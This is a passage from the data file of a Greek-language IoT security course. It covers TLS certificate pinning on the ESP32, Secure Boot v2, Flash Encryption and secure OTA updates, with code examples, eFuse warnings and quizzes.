            '- **Μην** χρησιμοποιήσεις ποτέ `client.tls_insecure_set(True)`: είναι το `setInsecure()` της Python.',
            '- `reason_code.is_failure`: στο paho 2.x το reason code είναι αντικείμενο, όχι απλός αριθμός.',
            '- Το `json.loads` σε `try`: δεδομένα από το δίκτυο μπορεί να είναι χαλασμένα ή κακόβουλα.'
          )),
          quiz('Στο MicroPython, ποια γραμμή είναι απαραίτητη για να **ελεγχθεί** το πιστοποιητικό του broker;',
            ['`ssl=True`', '`ctx.verify_mode = ssl.CERT_REQUIRED` μαζί με `load_verify_locations`', '`keepalive=60`', '`ntptime.settime()`'], 1,
            'Χωρίς `CERT_REQUIRED` και τη CA, έχεις κρυπτογράφηση χωρίς ταυτοποίηση, άρα ανοιχτό σε MITM.'),
          quiz('Ποια είναι η αντίστοιχη «κακή» επιλογή του `setInsecure()` στο paho-mqtt;',
            ['`client.tls_set(ca_certs=CA)`', '`client.tls_insecure_set(True)`', '`client.username_pw_set()`', '`client.loop_forever()`'], 1,
            'Το `tls_insecure_set(True)` απενεργοποιεί τον έλεγχο ονόματος του server. Για δοκιμές μόνο, ποτέ σε πραγματική χρήση.'),
        ],
      },
      {
        id: 'iot-4-6', title: 'HTTPS από το ESP32 και certificate pinning', minutes: 16,
        goal: 'Να κάνεις HTTPS requests από το ESP32 με σωστό έλεγχο, να καταλάβεις τι είναι **certificate pinning** (CA pin, leaf/fingerprint pin) και πότε σε «δαγκώνει».',
        blocks: [
          text(
            'Το ESP32 συχνά μιλάει και **HTTP(S)**: για OTA, για APIs (καιρός, ώρα), για webhooks. Ισχύουν τα ίδια με το MQTT: **ποτέ** `setInsecure()`.',
            '',
            '**Pinning** σημαίνει: «δεν εμπιστεύομαι οποιαδήποτε έγκυρη CA του κόσμου, αλλά μόνο **αυτή** τη συγκεκριμένη CA, ή μόνο **αυτό** το συγκεκριμένο πιστοποιητικό».'
          ),
          table(['Είδος', 'Τι ελέγχει', 'Πλεονέκτημα', 'Κίνδυνος'], [
            ['**CA pinning**', 'Ότι το cert υπογράφηκε από τη CA X', 'Αντέχει ανανεώσεις του server cert', 'Αν ο πάροχος αλλάξει CA, σπάει'],
            ['**Leaf / fingerprint pinning**', 'Το SHA-256 του ακριβούς πιστοποιητικού', 'Πολύ αυστηρό', 'Σπάει σε **κάθε** ανανέωση (Let’s Encrypt: κάθε 60–90 μέρες)'],
            ['**Δική σου CA** (Εν. 4.3)', 'Μόνο ό,τι υπέγραψες εσύ', 'Πλήρης έλεγχος, μακροχρόνιο', 'Πρέπει να προστατεύεις το `ca.key`'],
          ]),
          code('cpp', 'https_get.ino: HTTPS με CA pinning (HTTPClient)', R`
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <HTTPClient.h>
#include "secrets.h"     // WIFI_SSID, WIFI_PASS, CA_CERT (η δική σου CA)

// Τοπικός server στο Pi με cert υπογεγραμμένο από τη δική σου CA
const char* URL = "https://pi-broker.local:8443/api/config";

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  while (WiFi.status() != WL_CONNECTED) delay(250);

  WiFiClientSecure client;
  client.setCACert(CA_CERT);                  // ✅ CA pinning

  HTTPClient https;
  https.setTimeout(10000);
  if (!https.begin(client, URL)) {
    Serial.println("begin() απέτυχε");
    return;
  }
  int code = https.GET();
  if (code == HTTP_CODE_OK) {
    String body = https.getString();
    if (body.length() > 2048) {               // όριο μεγέθους
      Serial.println("Πολύ μεγάλη απάντηση, αγνοήθηκε");
    } else {
      Serial.println(body);
    }
  } else {
    Serial.printf("HTTP σφάλμα: %d (%s)\n", code, https.errorToString(code).c_str());
  }
  https.end();
}

void loop() {}
`, L(
            '- `HTTPClient` + `WiFiClientSecure`: το HTTPClient χρησιμοποιεί τον secure client που του δίνεις, άρα και τον έλεγχο της CA.',
            '- `https.begin(client, URL)`: πάντα η μορφή **με** client. Η παλιά μορφή με fingerprint string είναι για ESP8266.',
            '- Έλεγχος `code` και **μεγέθους** απάντησης: η μνήμη του ESP32 είναι λίγη. Μια τεράστια απάντηση (κακόβουλη ή όχι) μπορεί να το ρίξει.',
            '- `errorToString(code)`: φιλικό μήνυμα για αρνητικούς κωδικούς (π.χ. `connection refused`).'
          )),
          code('cpp', 'Fingerprint pinning με WiFiClientSecure::verify()', R`
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include "secrets.h"

// SHA-256 του server.crt:
//   openssl x509 -in server.crt -noout -fingerprint -sha256
const char* HOST = "pi-broker.local";
const char* FP_SHA256 =
  "3A:1F:9C:44:...:7B";      // ΒΑΛΕ ΤΟ ΔΙΚΟ ΣΟΥ (32 bytes σε hex)

void setup() {
  Serial.begin(115200);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  while (WiFi.status() != WL_CONNECTED) delay(250);

  WiFiClientSecure c;
  c.setCACert(CA_CERT);                       // 1ο επίπεδο: η CA
  if (!c.connect(HOST, 8443)) {
    Serial.println("TLS αποτυχία");
    return;
  }
  if (!c.verify(FP_SHA256, HOST)) {           // 2ο επίπεδο: το ακριβές cert
    Serial.println("❌ Fingerprint δεν ταιριάζει, κλείνω");
    c.stop();
    return;
  }
  c.print("GET /api/config HTTP/1.1\r\nHost: pi-broker.local\r\nConnection: close\r\n\r\n");
  while (c.connected() || c.available()) {
    if (c.available()) Serial.write(c.read());
  }
  c.stop();
}

void loop() {}
`, L(
            '- `openssl x509 … -fingerprint -sha256`: δίνει το αποτύπωμα του πιστοποιητικού του server.',
            '- Πρώτα `setCACert` (ο κανονικός έλεγχος), μετά `verify(fp, host)`: συγκρίνει το SHA-256 του πιστοποιητικού που έστειλε ο server με το δικό σου.',
            '- Αν ανανεώσεις το `server.crt`, πρέπει να ενημερώσεις το firmware **πριν**. Αλλιώς η συσκευή κόβεται. Γι’ αυτό, για δικές σου συσκευές, η δική σου CA είναι συνήθως αρκετή.',
            '- Χειροκίνητο HTTP request: χρήσιμο για να δεις τι γίνεται «κάτω από το καπό».'
          )),
          code('python', 'Το ίδιο στην Python (π.χ. ένα script στο Pi που μιλάει με ESP32 web server)', R`
import hashlib
import socket
import ssl

HOST, PORT = "pi-broker.local", 8443
PIN = "3a1f9c44...7b"        # SHA-256 του cert, hex πεζά χωρίς ':'

ctx = ssl.create_default_context(cafile="ca.crt")    # CA pinning
with socket.create_connection((HOST, PORT), timeout=5) as raw:
    with ctx.wrap_socket(raw, server_hostname=HOST) as tls:
        der = tls.getpeercert(binary_form=True)
        fp = hashlib.sha256(der).hexdigest()
        if fp != PIN:
            raise SystemExit(f"❌ pin mismatch: {fp}")
        print("✅ TLS", tls.version(), "pin OK")

# Ή απλά με requests (μόνο CA pinning):
# requests.get(f"https://{HOST}:{PORT}/api/config", verify="ca.crt", timeout=5)
`, L(
            '- `create_default_context(cafile=…)`: εμπιστεύεται **μόνο** τη δική σου CA και ελέγχει όνομα.',
            '- `getpeercert(binary_form=True)`: το πιστοποιητικό σε DER, για να το κάνουμε hash.',
            '- `verify="ca.crt"` στο `requests`: ποτέ `verify=False`.'
          )),
          tip('Για **δημόσια** sites (π.χ. API καιρού) στο Arduino core 3.x υπάρχει και το `setCACertBundle()`, με ένα πακέτο από τις γνωστές root CA. Είναι καλύτερο από το `setInsecure()`, αλλά λιγότερο αυστηρό από το pinning.'),
          quiz('Κάνεις **leaf pinning** σε server με Let’s Encrypt. Τι θα συμβεί σε ~60–90 μέρες;',
            ['Τίποτα', 'Το πιστοποιητικό ανανεώνεται, το fingerprint αλλάζει και η συσκευή σταματά να συνδέεται', 'Η συσκευή γίνεται πιο ασφαλής', 'Το ESP32 ενημερώνεται μόνο του'], 1,
            'Γι’ αυτό το leaf pinning θέλει **σχέδιο ανανέωσης** (δύο pins: τρέχον και επόμενο) ή προτιμάς CA/public-key pinning.'),
          quiz('Ποια είναι η σωστή σειρά ελέγχων για fingerprint pinning με `WiFiClientSecure`;',
            ['`setInsecure()` και μετά `verify()`', '`setCACert()`, `connect()`, μετά `verify(fp, host)` πριν στείλεις δεδομένα', 'Μόνο `verify()` μετά το request', 'Μόνο `connect()`'], 1,
            'Ελέγχεις **πριν** στείλεις οτιδήποτε ευαίσθητο. Το `setCACert` δίνει τον βασικό έλεγχο, το `verify` το επιπλέον pin.'),
        ],
      },
    ],
  });

  // ====================================================================
  // MODULE 5 — Ασφάλεια firmware
  // ====================================================================
  const EFUSE_WARN = warn(
    '**ΠΡΟΣΟΧΗ: τα eFuses καίγονται ΜΙΑ φορά και για πάντα.** Δεν υπάρχει undo, ούτε «factory reset». Ένα λάθος (χαμένο signing key, λάθος mode, διακοπή ρεύματος στην πρώτη εκκίνηση) μπορεί να κάνει το chip **μόνιμα άχρηστο** (brick) ή να μην μπορεί να πάρει ποτέ ξανά νέο firmware.',
    '- Δοκίμασε **πρώτα** σε φτηνή πλακέτα που είσαι διατεθειμένος να χάσεις.',
    '- Κράτα **backup** του signing key σε δύο ασφαλή μέρη (όχι στο Git!).',
    '- Διάβασε την επίσημη τεκμηρίωση του ESP-IDF για το **δικό σου** chip (ESP32, S2, S3, C3, C6…): οι λεπτομέρειες διαφέρουν.',
    '- Ξεκίνα σε **Development mode** και πήγαινε σε Release μόνο όταν όλα δουλεύουν.'
  );

  M.push({
    id: 'iot-5', order: 5, title: 'Ασφάλεια firmware: Secure Boot, Flash Encryption, OTA',
    desc: 'Secure Boot v2, Flash Encryption, υπογεγραμμένα OTA (ArduinoOTA, HTTPS OTA) και απενεργοποίηση JTAG/UART. Με ESP-IDF v5.',
    lessons: [
      {
        id: 'iot-5-1', title: 'Secure Boot v2: μόνο το δικό σου firmware τρέχει', minutes: 18,
        goal: 'Να καταλάβεις την **αλυσίδα εμπιστοσύνης** του Secure Boot v2 (ROM → bootloader → app), τι γράφεται στα eFuses, και πώς το ενεργοποιείς με `idf.py`/`espsecure.py` χωρίς να καταστρέψεις το chip.',
        blocks: [
          text(
            'Χωρίς Secure Boot, όποιος έχει πρόσβαση (USB ή ένα ανοιχτό OTA) γράφει **οποιοδήποτε** firmware στο ESP32 σου και αυτό τρέχει. Με Secure Boot, το chip τρέχει **μόνο** firmware υπογεγραμμένο με το **δικό σου** ιδιωτικό κλειδί.',
            '',
            '### Πώς δουλεύει (Secure Boot v2)',
            '1. Φτιάχνεις ένα **signing key** (RSA-3072, ή ECDSA σε νεότερα chips). Το ιδιωτικό μένει σε σένα.',
            '1. Το build **υπογράφει** τον bootloader και το app. Η υπογραφή και το δημόσιο κλειδί μπαίνουν σε ένα *signature block* στο τέλος κάθε image.',
            '1. Στην πρώτη εκκίνηση, ο bootloader γράφει στα **eFuses** το **SHA-256 του δημόσιου κλειδιού** και ενεργοποιεί το Secure Boot.',
            '1. Σε κάθε εκκίνηση: το **ROM** (αμετάβλητος κώδικας μέσα στο chip) ελέγχει τον bootloader, και ο bootloader ελέγχει το app. Αν κάτι δεν ταιριάζει, **δεν εκκινεί**.'
          ),
          anim('iot-secure-boot', 'Η ρίζα εμπιστοσύνης είναι το hash στα eFuses. Δεν αλλάζει, άρα δεν «ξεγελιέται».'),
          table(['Chip', 'Secure Boot v2', 'Αλγόριθμος', 'Κλειδιά'], [
            ['ESP32', 'Μόνο από revision **v3.0** (ECO3) και μετά', 'RSA-3072 (RSA-PSS)', '1'],
            ['ESP32-S2 / S3 / C3', 'Ναι', 'RSA-3072', 'Έως 3 (με δυνατότητα ανάκλησης)'],
            ['ESP32-C6 / H2 και νεότερα', 'Ναι', 'RSA-3072 ή ECDSA (P-256)', 'Έως 3'],
          ]),
          text('Δες τι chip και revision έχεις, και την κατάσταση των eFuses **πριν** αλλάξεις οτιδήποτε:'),
          code('bash', 'Αναγνώριση chip και eFuses (ασφαλές, μόνο ανάγνωση)', R`
# Στο ESP-IDF v5 (με ενεργό το περιβάλλον: . $HOME/esp/esp-idf/export.sh)
esptool.py -p /dev/ttyUSB0 chip_id          # τύπος chip, revision, MAC
espefuse.py -p /dev/ttyUSB0 summary         # ΟΛΑ τα eFuses και η τιμή τους
espefuse.py -p /dev/ttyUSB0 summary | grep -Ei 'secure_boot|abs_done|flash_crypt|spi_boot_crypt|jtag|download'
`, L(
            '- `chip_id`: π.χ. `Chip is ESP32-D0WD-V3 (revision v3.1)`. Για Secure Boot v2 στο κλασικό ESP32 χρειάζεσαι v3.x.',
            '- `espefuse.py summary`: μόνο ανάγνωση, δεν αλλάζει τίποτα. Κράτα αντίγραφο του output ως «πριν».',
            '- Στο **esptool v5** οι εντολές λέγονται `esptool`, `espefuse`, `espsecure` (χωρίς `.py`) με παύλες (`chip-id`). Οι παλιές μορφές δουλεύουν ακόμα με προειδοποίηση.'
          )),
          EFUSE_WARN,
          code('bash', 'Ενεργοποίηση Secure Boot v2 σε project ESP-IDF v5', R`
cd ~/esp/my_sensor
idf.py set-target esp32s3            # ή esp32, esp32c3 …

# 1) Signing key (ΚΡΑΤΑ ΤΟ ΜΥΣΤΙΚΟ ΚΑΙ ΜΕ BACKUP)
espsecure.py generate_signing_key --version 2 --scheme rsa3072 secure_boot_signing_key.pem
chmod 600 secure_boot_signing_key.pem

# 2) menuconfig → Security features
#    [*] Enable hardware Secure Boot in bootloader
#        Select secure boot version → Enable Secure Boot version 2
#    [*] Sign binaries during build
#        (secure_boot_signing_key.pem) Secure boot private signing key
idf.py menuconfig

# 3) Build (υπογράφονται bootloader και app)
idf.py build

# 4) Ο bootloader ΔΕΝ γράφεται με το απλό "flash" όταν έχει Secure Boot.
idf.py -p /dev/ttyUSB0 bootloader-flash
idf.py -p /dev/ttyUSB0 flash monitor

# 5) Μετά την πρώτη εκκίνηση: επιβεβαίωση
espefuse.py -p /dev/ttyUSB0 summary | grep -Ei 'secure_boot_en|abs_done_1|key_purpose'
`, L(
            '- `generate_signing_key --version 2 --scheme rsa3072`: δημιουργεί το ιδιωτικό κλειδί. Χωρίς αυτό **δεν θα μπορείς ποτέ** να ξαναπρογραμματίσεις τη συσκευή.',
            '- Στο menuconfig για κλασικό ESP32 πρέπει επίσης *Component config → Hardware Settings → Chip revision → Minimum Supported ESP32 Revision = Rev v3.0*.',
            '- `idf.py build`: παράγει υπογεγραμμένα `bootloader.bin` και `app.bin`.',
            '- `bootloader-flash`: ο bootloader γράφεται χωριστά, σκόπιμα, για να μη τον αντικαταστήσεις κατά λάθος.',
            '- Στην **πρώτη εκκίνηση** ο bootloader καίει τα eFuses (digest του κλειδιού, `SECURE_BOOT_EN` ή `ABS_DONE_1` στο ESP32). Μην κόψεις ρεύμα!',
            '- Από εκεί και πέρα, κάθε νέο app πρέπει να είναι υπογεγραμμένο με **το ίδιο** κλειδί.'
          )),
          code('text', 'sdkconfig.defaults (για να είναι αναπαραγώγιμο το build)', R`
CONFIG_SECURE_BOOT=y
CONFIG_SECURE_BOOT_V2_ENABLED=y
CONFIG_SECURE_BOOT_BUILD_SIGNED_BINARIES=y
CONFIG_SECURE_BOOT_SIGNING_KEY="secure_boot_signing_key.pem"
# Μόνο για κλασικό ESP32:
# CONFIG_ESP32_REV_MIN_3=y
# Για development, ΠΡΙΝ το release, μπορείς προσωρινά:
# CONFIG_SECURE_BOOT_INSECURE=y   (αφήνει JTAG/ROM download ενεργά. ΟΧΙ σε παραγωγή)
`, L(
            '- Το `sdkconfig.defaults` μπαίνει στο Git (δεν έχει μυστικά). Το `.pem` **όχι**.',
            '- `CONFIG_SECURE_BOOT_INSECURE`: χρήσιμο στο στάδιο ανάπτυξης· σε παραγωγή αφήνεις τα defaults, που κλείνουν JTAG και άλλες «πόρτες».'
          )),
          code('bash', 'Έλεγχος υπογραφής ενός image στον υπολογιστή σου', R`
espsecure.py verify_signature --version 2 --keyfile secure_boot_signing_key.pem build/my_sensor.bin
# Signature block 0 verification successful using the supplied key (RSA).
`, L(
            '- Χρήσιμο πριν ανεβάσεις ένα OTA: βεβαιώνεσαι ότι το αρχείο είναι υπογεγραμμένο με το σωστό κλειδί.'
          )),
          tip('Χρησιμοποιείς **Arduino IDE**; Το Secure Boot και το Flash Encryption θέλουν build με δικό σου bootloader και sdkconfig, κάτι που το Arduino IDE δεν κάνει. Οι επιλογές σου: **ESP-IDF** απευθείας, **Arduino ως component του ESP-IDF**, ή **PlatformIO** με `framework = arduino, espidf`.'),
          quiz('Πού αποθηκεύεται η «ρίζα εμπιστοσύνης» του Secure Boot v2;',
            ['Στο SPI flash, στο partition nvs', 'Στα eFuses του chip, ως SHA-256 του δημόσιου κλειδιού', 'Στον bootloader', 'Στο cloud της Espressif'], 1,
            'Τα eFuses είναι bits που καίγονται μία φορά. Επειδή δεν αλλάζουν, ένας επιτιθέμενος δεν μπορεί να βάλει το δικό του κλειδί.'),
          quiz('Χάνεις το `secure_boot_signing_key.pem` μετά την ενεργοποίηση Secure Boot. Τι σημαίνει;',
            ['Τίποτα, φτιάχνεις νέο', 'Δεν μπορείς πια να εκκινήσεις νέο firmware σε αυτή τη συσκευή (εκτός αν έχεις δεύτερο κλειδί σε chip με πολλά slots)', 'Η συσκευή απενεργοποιεί το Secure Boot', 'Το κατεβάζεις από την Espressif'], 1,
            'Κάθε νέο image πρέπει να υπογράφεται με κλειδί του οποίου το hash είναι στα eFuses. Χωρίς το κλειδί, η συσκευή μένει για πάντα στο τρέχον firmware.'),
        ],
      },
      {
        id: 'iot-5-2', title: 'Flash Encryption και NVS Encryption', minutes: 17,
        goal: 'Να καταλάβεις τι προστατεύει το **Flash Encryption** (και τι όχι), τη διαφορά Development/Release mode, και πώς κρυπτογραφείς και το NVS όπου ζουν οι κωδικοί σου.',
        blocks: [
          text(
            'Το Secure Boot εμποδίζει να **τρέξει** ξένος κώδικας. Δεν εμποδίζει όμως κάποιον να **διαβάσει** το flash και να βρει τους κωδικούς σου (θα το δούμε στην Εν. 6). Γι’ αυτό υπάρχει το **Flash Encryption**:',
            '- Στην πρώτη εκκίνηση, ο bootloader **δημιουργεί τυχαίο κλειδί** μέσα στο chip και το γράφει σε eFuse που **δεν διαβάζεται** από λογισμικό.',
            '- Κρυπτογραφεί **επί τόπου** τον bootloader, τον partition table, τα app partitions και όσα partitions έχουν σημαία `encrypted`.',
            '- Η αποκρυπτογράφηση γίνεται **διαφανώς** από το hardware κατά την ανάγνωση. Ο κώδικάς σου δεν αλλάζει.',
            '- Αλγόριθμος: AES-256 (ESP32) ή **XTS-AES** (S2/S3/C3/C6…).'
          ),
          table(['', 'Development mode', 'Release mode'], [
            ['Νέο firmware μέσω USB', '✅ με `idf.py encrypted-flash`', '❌ μόνο OTA'],
            ['Απενεργοποίηση encryption', 'Περιορισμένες φορές (μετρητής σε eFuse)', '❌ ποτέ'],
            ['Κατάλληλο για', 'Δοκιμές στο γραφείο', 'Συσκευές που φεύγουν από τα χέρια σου'],
          ]),
          EFUSE_WARN,
          code('text', 'partitions.csv με NVS encryption και OTA', R`
# Name,    Type, SubType,  Offset, Size,   Flags
nvs,       data, nvs,      ,       0x6000,
nvs_keys,  data, nvs_keys, ,       0x1000, encrypted
otadata,   data, ota,      ,       0x2000,
phy_init,  data, phy,      ,       0x1000,
ota_0,     app,  ota_0,    ,       1500K,
ota_1,     app,  ota_1,    ,       1500K,
`, L(
            '- Τα **app** partitions κρυπτογραφούνται πάντα όταν το flash encryption είναι ενεργό.',
            '- Το **nvs** δεν κρυπτογραφείται με τον ίδιο μηχανισμό (το NVS γράφεται συχνά και χρειάζεται άλλη μέθοδο). Γι’ αυτό υπάρχει το **NVS Encryption**.',
            '- `nvs_keys … encrypted`: εδώ ζουν τα κλειδιά του NVS, προστατευμένα από το flash encryption.',
            '- `ota_0`/`ota_1`: δύο θέσεις για firmware, ώστε το OTA να γράφει στη μία ενώ τρέχει η άλλη (Εν. 5.3).',
            '- Κενό offset = το ESP-IDF το υπολογίζει (τα app partitions στοιχίζονται σε 64 KB).'
          )),
          code('text', 'sdkconfig.defaults', R`
CONFIG_PARTITION_TABLE_CUSTOM=y
CONFIG_PARTITION_TABLE_CUSTOM_FILENAME="partitions.csv"

CONFIG_SECURE_FLASH_ENC_ENABLED=y
CONFIG_SECURE_FLASH_ENCRYPTION_MODE_DEVELOPMENT=y
# Για παραγωγή (ΜΟΝΟ όταν όλα έχουν δοκιμαστεί):
# CONFIG_SECURE_FLASH_ENCRYPTION_MODE_RELEASE=y

CONFIG_NVS_ENCRYPTION=y
`, L(
            '- `SECURE_FLASH_ENC_ENABLED`: ενεργοποίηση στην επόμενη εκκίνηση.',
            '- Ξεκίνα **πάντα** με `DEVELOPMENT`. Το `RELEASE` κλείνει μόνιμα το flashing από USB.',
            '- `NVS_ENCRYPTION`: τα δεδομένα του `Preferences`/NVS κρυπτογραφούνται. Σε chips με HMAC peripheral (S3, C3, C6) υπάρχει και σχήμα με κλειδί από HMAC eFuse χωρίς `nvs_keys`.'
          )),
          code('bash', 'Πρώτη ενεργοποίηση και επόμενα flash (Development mode)', R`
# Πρώτη φορά: κανονικό flash. Ο bootloader θα κρυπτογραφήσει στο boot.
idf.py -p /dev/ttyUSB0 flash monitor
#   Θα δεις: "Generating new flash encryption key..." και
#            "Encrypting partition ..." → ΜΗΝ ΚΟΨΕΙΣ ΡΕΥΜΑ (1-2 λεπτά)

# Έλεγχος
espefuse.py -p /dev/ttyUSB0 summary | grep -Ei 'flash_crypt_cnt|spi_boot_crypt_cnt'
#   Περιττός αριθμός bits = ενεργό

# Από εδώ και πέρα (Development mode): ΠΑΝΤΑ encrypted-flash
idf.py -p /dev/ttyUSB0 encrypted-flash monitor
idf.py -p /dev/ttyUSB0 encrypted-app-flash          # μόνο το app, πιο γρήγορο
`, L(
            '- Η πρώτη εκκίνηση κρυπτογραφεί όλο το περιεχόμενο **επί τόπου**. Διακοπή ρεύματος εκείνη τη στιγμή μπορεί να αφήσει το flash μισο-κρυπτογραφημένο.',
            '- `FLASH_CRYPT_CNT` (ESP32) / `SPI_BOOT_CRYPT_CNT` (S2/S3/C3…): μετρητής σε eFuse. Περιττός αριθμός ενεργών bits = encryption ενεργό.',
            '- Αν μετά γράψεις με απλό `idf.py flash`, ο bootloader θα δει **μη κρυπτογραφημένα** δεδομένα, θα τα «αποκρυπτογραφήσει» σε σκουπίδια και η συσκευή δεν θα εκκινεί (μέχρι να ξαναγράψεις σωστά).'
          )),
          table(['Προστατεύει από…', 'Ναι/Όχι'], [
            ['Ανάγνωση του flash με esptool ή clip στο chip flash', '✅ βλέπει μόνο κρυπτογραφημένα δεδομένα'],
            ['Αντιγραφή του firmware σε άλλη συσκευή', '✅ το κλειδί είναι μοναδικό ανά chip'],
            ['Εκτέλεση ξένου firmware', '❌ γι’ αυτό χρειάζεσαι **και** Secure Boot'],
            ['Bugs στον κώδικά σου (π.χ. buffer overflow μέσω MQTT)', '❌ το firmware τρέχει κανονικά, αποκρυπτογραφημένο'],
            ['Κωδικούς που τυπώνεις στο Serial', '❌ μην τους τυπώνεις'],
          ]),
          tip('Πρακτικός κανόνας: **Secure Boot + Flash Encryption μαζί**, σε Release mode, για κάθε συσκευή που θα βρεθεί σε χώρο όπου έχουν πρόσβαση άλλοι (κήπος, αποθήκη, μαγαζί, πελάτης).'),
          quiz('Έχεις μόνο Flash Encryption (χωρίς Secure Boot). Ποια επίθεση **δεν** σταματάς;',
            ['Ανάγνωση κωδικών Wi‑Fi από dump του flash', 'Εκτέλεση firmware του επιτιθέμενου στη συσκευή', 'Αντιγραφή του firmware σε άλλο chip', 'Ανάγνωση με clip στο chip flash'], 1,
            'Το Flash Encryption προστατεύει την **εμπιστευτικότητα**. Για το ποιος κώδικας **τρέχει** χρειάζεσαι Secure Boot. Τα δύο μαζί κάνουν τη δουλειά.'),
          quiz('Σε Development mode με flash encryption, πώς ανεβάζεις νέο firmware από USB;',
            ['`idf.py flash`', '`idf.py encrypted-flash`', '`esptool.py erase_flash`', 'Δεν γίνεται'], 1,
            'Το `encrypted-flash` ζητά από το ROM να κρυπτογραφήσει τα δεδομένα με το κλειδί του chip καθώς τα γράφει. Σε Release mode ούτε αυτό επιτρέπεται.'),
        ],
      },
      {
        id: 'iot-5-3', title: 'Ασφαλή OTA updates: κωδικός, HTTPS, υπογραφή, rollback', minutes: 22,
        goal: 'Να ρυθμίσεις **ArduinoOTA** με κωδικό (και να ξέρεις τα όριά του), να κάνεις **HTTPS OTA** σε Arduino και ESP-IDF (`esp_https_ota`), και να προσθέσεις **υπογραφή** και **rollback**.',
        blocks: [
          text(
            'Το OTA σού επιτρέπει να διορθώνεις bugs και ευπάθειες χωρίς να πας με καλώδιο σε κάθε συσκευή. Χωρίς OTA, μια ευπάθεια μένει για πάντα (OWASP **I4**). Ένα **ανασφαλές** OTA όμως είναι κερκόπορτα: όποιος το βρει, ανεβάζει δικό του firmware.',
            '',
            '### Τα 4 επίπεδα ασφάλειας στο OTA',
            '1. **Authentication**: ποιος επιτρέπεται να ξεκινήσει update; (κωδικός OTA)',
            '1. **Transport**: το αρχείο έρχεται κρυπτογραφημένο από τον σωστό server; (HTTPS + CA)',
            '1. **Integrity/Authenticity**: το firmware το έφτιαξα **εγώ**; (ψηφιακή υπογραφή)',
            '1. **Recovery**: αν το νέο firmware χαλάσει, επιστρέφει στο παλιό; (rollback) Και δεν δέχεται παλιές ευάλωτες εκδόσεις; (anti-rollback)'
          ),
          anim('iot-ota-signed', 'Από το ανοιχτό ArduinoOTA στο υπογεγραμμένο HTTPS OTA με anti-rollback.'),
          code('cpp', 'Επίπεδο 1: ArduinoOTA με κωδικό και «παράθυρο» ενεργοποίησης', R`
#include <WiFi.h>
#include <ArduinoOTA.h>
#include "secrets.h"        // WIFI_SSID, WIFI_PASS, OTA_PASS

bool otaEnabled = false;
uint32_t otaUntil = 0;

void enableOtaFor(uint32_t ms) {
  if (!otaEnabled) {
    ArduinoOTA.setHostname("sensor01");
    ArduinoOTA.setPassword(OTA_PASS);       // ✅ χωρίς αυτό: ανοιχτό σε όλο το LAN
    ArduinoOTA.onStart([]() { Serial.println("[OTA] έναρξη"); });
    ArduinoOTA.onEnd([]()   { Serial.println("[OTA] τέλος"); });
    ArduinoOTA.onError([](ota_error_t e) {
      Serial.printf("[OTA] σφάλμα %u%s\n", e, e == OTA_AUTH_ERROR ? " (λάθος κωδικός)" : "");
    });
    ArduinoOTA.begin();
    otaEnabled = true;
  }
  otaUntil = millis() + ms;
  Serial.printf("[OTA] ανοιχτό για %lus\n", ms / 1000);
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  while (WiFi.status() != WL_CONNECTED) delay(250);
  pinMode(0, INPUT_PULLUP);
}

void loop() {
  // Το OTA ανοίγει ΜΟΝΟ αν πατήσεις το BOOT (ή με εντολή MQTT από εξουσιοδοτημένο χρήστη)
  if (digitalRead(0) == LOW) enableOtaFor(5UL * 60 * 1000);
  if (otaEnabled) {
    ArduinoOTA.handle();
    if ((int32_t)(millis() - otaUntil) > 0) {
      ArduinoOTA.end();
      otaEnabled = false;
      Serial.println("[OTA] έκλεισε");
    }
  }
  delay(10);
}
`, L(
            '- `setPassword(OTA_PASS)`: το Arduino IDE/`espota.py` πρέπει να ξέρει τον κωδικό. Η πιστοποίηση γίνεται με challenge-response, ο κωδικός δεν ταξιδεύει ανοιχτός. Υπάρχει και `setPasswordHash()` για να μην είναι ο κωδικός μέσα στο firmware.',
            '- **Όρια του ArduinoOTA:** το firmware ταξιδεύει **χωρίς κρυπτογράφηση** και **χωρίς υπογραφή**, και η θύρα 3232 ανακοινώνεται μέσω mDNS. Είναι εργαλείο ανάπτυξης για το LAN, όχι λύση παραγωγής.',
            '- **Παράθυρο 5 λεπτών:** το OTA ανοίγει μόνο όταν το ζητήσεις και κλείνει μόνο του. Τον υπόλοιπο χρόνο η 3232 είναι κλειστή.',
            '- `(int32_t)(millis() - otaUntil) > 0`: σύγκριση που αντέχει το overflow του `millis()` μετά από ~49 μέρες.'
          )),
          text('### Επίπεδο 2: HTTPS OTA (Arduino core)'),
          code('cpp', 'https_ota.ino: έλεγχος για νέα έκδοση και update μέσω HTTPS', R`
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <HTTPUpdate.h>
#include "secrets.h"          // WIFI_SSID, WIFI_PASS, CA_CERT

#define FW_VERSION "1.4.0"
const char* OTA_URL = "https://pi-broker.local:8443/fw/sensor01.bin";

void checkForUpdate() {
  WiFiClientSecure client;
  client.setCACert(CA_CERT);            // ✅ μόνο ο δικός μας server
  httpUpdate.rebootOnUpdate(true);
  httpUpdate.onProgress([](int cur, int total) {
    Serial.printf("[OTA] %d%%\r", total ? cur * 100 / total : 0);
  });

  // Στέλνει header x-ESP32-version: ο server απαντά 304 αν δεν υπάρχει νεότερη
  t_httpUpdate_return r = httpUpdate.update(client, OTA_URL, FW_VERSION);
  switch (r) {
    case HTTP_UPDATE_FAILED:
      Serial.printf("[OTA] αποτυχία (%d): %s\n", httpUpdate.getLastError(),
                    httpUpdate.getLastErrorString().c_str());
      break;
    case HTTP_UPDATE_NO_UPDATES:
      Serial.println("[OTA] καμία νέα έκδοση");
      break;
    case HTTP_UPDATE_OK:
      Serial.println("[OTA] OK, επανεκκίνηση");   // δεν φτάνει εδώ με rebootOnUpdate(true)
      break;
  }
}

void setup() {
  Serial.begin(115200);
  Serial.printf("Firmware %s\n", FW_VERSION);
  WiFi.mode(WIFI_STA);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  while (WiFi.status() != WL_CONNECTED) delay(250);
  checkForUpdate();
}

void loop() {
  static uint32_t last = 0;
  if (millis() - last > 6UL * 3600 * 1000) {   // κάθε 6 ώρες
    last = millis();
    checkForUpdate();
  }
}
`, L(
            '- Η **συσκευή** ρωτάει τον server (pull). Δεν ακούει σε καμία θύρα, άρα κανείς δεν μπορεί να της «σπρώξει» update.',
